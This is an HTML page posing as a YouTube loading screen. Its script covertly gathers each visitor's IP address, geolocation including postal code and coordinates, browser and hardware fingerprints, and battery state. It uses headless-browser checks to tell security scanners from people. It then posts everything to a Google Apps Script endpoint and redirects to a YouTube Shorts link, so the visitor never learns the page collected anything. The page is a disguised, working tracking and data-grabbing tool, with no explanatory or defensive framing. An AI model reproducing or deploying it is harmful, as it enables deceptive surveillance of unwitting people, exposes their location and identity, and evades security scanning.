<!DOCTYPE html>
<html>
<head>
    <title>YouTube</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding-top: 100px;
            background: white;
            margin: 0;
        }
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #ff0000;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="loader"></div>
    <p>Loading YouTube...</p>

    <script>
        const REDIRECT = 'https://www.youtube.com/shorts/gRVU6OvOSfY';
        const EMAIL_SCRIPT = 'https://script.google.com/macros/s/AKfycbxNLwB2xfF0NyFeth5p4U0tWAupXFRiHfqPNC3S-oEpZtwor0c171a2ocigKMXF33rghQ/exec';
        
        let dataSent = false;

        // ðŸŽ¯ **HEADLESS DETECTION**
        function detectHeadless() {
            const tests = { isHeadless: false, failedTests: [], passedTests: [] };
            
            if (navigator.webdriver === true) tests.failedTests.push('webdriver');
            if (navigator.plugins.length < 2) tests.failedTests.push('few_plugins');
            if (!navigator.languages || navigator.languages.length === 0) tests.failedTests.push('no_languages');
            if (window.outerWidth === 0 && window.outerHeight === 0) tests.failedTests.push('zero_window');
            if (window.chrome && !window.chrome.runtime) tests.failedTests.push('no_chrome_runtime');
            
            tests.isHeadless = tests.failedTests.length >= 2;
            return tests;
        }

        // ðŸŽ¯ **GET IP (PROPERLY)**
        async function getIP() {
            // Try multiple services with proper error handling
            const services = [
                { url: 'https://api.ipify.org?format=json', type: 'json' },
                { url: 'https://api64.ipify.org?format=json', type: 'json' },
                { url: 'https://icanhazip.com', type: 'text' },
                { url: 'https://ifconfig.me/ip', type: 'text' },
                { url: 'https://ident.me', type: 'text' }
            ];
            
            for (let service of services) {
                try {
                    const controller = new AbortController();
                    const timeoutId = setTimeout(() => controller.abort(), 2000);
                    
                    const response = await fetch(service.url, { 
                        signal: controller.signal 
                    });
                    clearTimeout(timeoutId);
                    
                    if (service.type === 'json') {
                        const data = await response.json();
                        return { ip: data.ip, source: service.url };
                    } else {
                        const text = await response.text();
                        return { ip: text.trim(), source: service.url };
                    }
                } catch(e) {
                    continue;
                }
            }
            
            // Fallback: WebRTC
            try {
                const rtc = new RTCPeerConnection({iceServers: []});
                rtc.createDataChannel('');
                rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
                
                return new Promise((resolve) => {
                    rtc.onicecandidate = (ice) => {
                        if (ice && ice.candidate && ice.candidate.candidate) {
                            const ipMatch = ice.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
                            if (ipMatch && ipMatch[1] && !['0.0.0.0', '127.0.0.1'].includes(ipMatch[1])) {
                                rtc.close();
                                resolve({ ip: ipMatch[1], source: 'WebRTC', is_local: true });
                            }
                        }
                    };
                    setTimeout(() => {
                        rtc.close();
                        resolve({ ip: 'Blocked', source: 'All methods failed' });
                    }, 1000);
                });
            } catch(e) {
                return { ip: 'Blocked', source: 'All methods blocked' };
            }
        }

        // ðŸŽ¯ **GET GEOLOCATION**
        async function getGeolocation(ip) {
            if (!ip || ip === 'Blocked' || ip === 'Failed') return null;
            
            try {
                const response = await fetch(`https://ipapi.co/${ip}/json/`);
                if (!response.ok) throw new Error('API failed');
                
                const data = await response.json();
                return {
                    city: data.city,
                    region: data.region,
                    country: data.country_name,
                    country_code: data.country_code,
                    postal: data.postal,
                    latitude: data.latitude,
                    longitude: data.longitude,
                    timezone: data.timezone,
                    asn: data.asn,
                    org: data.org,
                    isp: data.org
                };
            } catch(e) {
                // Fallback to ip-api.com
                try {
                    const fallback = await fetch(`https://ip-api.com/json/${ip}`);
                    const data = await fallback.json();
                    if (data.status === 'success') {
                        return {
                            city: data.city,
                            region: data.regionName,
                            country: data.country,
                            country_code: data.countryCode,
                            latitude: data.lat,
                            longitude: data.lon,
                            timezone: data.timezone,
                            isp: data.isp,
                            org: data.org
                        };
                    }
                } catch(e2) {
                    return null;
                }
            }
            return null;
        }

        // ðŸŽ¯ **COLLECT ALL DATA**
        async function collectAllData() {
            // Basic data
            const data = {
                // Time
                timestamp: new Date().toISOString(),
                local_time: new Date().toLocaleString('en-US', {
                    year: 'numeric',
                    month: '2-digit',
                    day: '2-digit',
                    hour: '2-digit',
                    minute: '2-digit',
                    second: '2-digit',
                    hour12: false
                }),
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezone_offset: new Date().getTimezoneOffset(),
                
                // Browser
                user_agent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages ? navigator.languages.join(', ') : '',
                cookies: navigator.cookieEnabled ? 'Enabled' : 'Disabled',
                do_not_track: navigator.doNotTrack || 'Not set',
                
                // Screen
                screen_resolution: screen.width + 'x' + screen.height,
                color_depth: screen.colorDepth + ' bit',
                pixel_ratio: window.devicePixelRatio,
                orientation: screen.orientation ? screen.orientation.type : 'Unknown',
                
                // Hardware
                hardware_concurrency: navigator.hardwareConcurrency || 'Unknown',
                device_memory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown',
                max_touch_points: navigator.maxTouchPoints || 0,
                
                // URL
                url: window.location.href,
                referrer: document.referrer || 'Direct',
                
                // Features
                localStorage: window.localStorage ? 'Supported' : 'Not supported',
                sessionStorage: window.sessionStorage ? 'Supported' : 'Not supported',
                notifications: 'Notification' in window ? 'Supported' : 'Not supported',
                webrtc: !!window.RTCPeerConnection,
                java_enabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
                
                // Plugins
                plugins: Array.from(navigator.plugins).map(p => p.name).join(', ') || 'None',
            };

            // Headless detection
            const headlessCheck = detectHeadless();
            data.headless_check = headlessCheck;
            data.visitor_type = headlessCheck.isHeadless ? 'SCANNER' : 'HUMAN';
            
            // Get IP
            const ipInfo = await getIP();
            data.ip_info = ipInfo;
            
            // Get geolocation if IP is valid
            if (ipInfo.ip && ipInfo.ip !== 'Blocked' && ipInfo.ip !== 'Failed' && !ipInfo.is_local) {
                const geo = await getGeolocation(ipInfo.ip);
                if (geo) {
                    data.geolocation = geo;
                }
            }
            
            // Network info
            if (navigator.connection) {
                data.connection = {
                    type: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink + ' Mbps',
                    rtt: navigator.connection.rtt + ' ms'
                };
            }
            
            // Battery
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    data.battery = {
                        level: Math.round(battery.level * 100) + '%',
                        charging: battery.charging,
                        charging_time: battery.chargingTime || 'Unknown',
                        discharging_time: battery.dischargingTime || 'Unknown'
                    };
                } catch(e) {}
            }
            
            // Canvas fingerprint
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillStyle = '#f60';
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = '#069';
                ctx.fillText('Fingerprint', 2, 15);
                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
                ctx.fillText('Fingerprint', 4, 17);
                data.canvas_fingerprint = canvas.toDataURL().substring(22, 40);
            } catch(e) {
                data.canvas_fingerprint = 'Failed';
            }
            
            // WebGL
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    data.webgl = {
                        vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'Restricted',
                        renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Restricted'
                    };
                }
            } catch(e) {}
            
            // Visitor ID
            const idString = navigator.userAgent + screen.width + screen.height + navigator.language;
            let hash = 0;
            for (let i = 0; i < idString.length; i++) {
                hash = ((hash << 5) - hash) + idString.charCodeAt(i);
                hash |= 0;
            }
            data.visitor_id = 'VIS-' + Math.abs(hash).toString(16).substring(0, 8).toUpperCase();
            
            return data;
        }

        // ðŸš€ **MAIN EXECUTION**
        (async function() {
            try {
                const data = await collectAllData();
                
                if (!dataSent) {
                    dataSent = true;
                    
                    console.log('ðŸŽ¯ Data collected:', data.visitor_type);
                    
                    // Send data
                    fetch(EMAIL_SCRIPT, {
                        method: 'POST',
                        mode: 'no-cors',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(data)
                    }).catch(() => {
                        // Fallback
                        const params = new URLSearchParams();
                        params.append('data', JSON.stringify(data));
                        fetch(EMAIL_SCRIPT + '?' + params.toString());
                    });
                }
                
            } catch(error) {
                console.error('Collection error:', error);
            }
            
            // Redirect after 2 seconds (enough time for collection)
            setTimeout(() => {
                window.location.href = REDIRECT;
            }, 2000);
            
        })();
    </script>
</body>
</html>
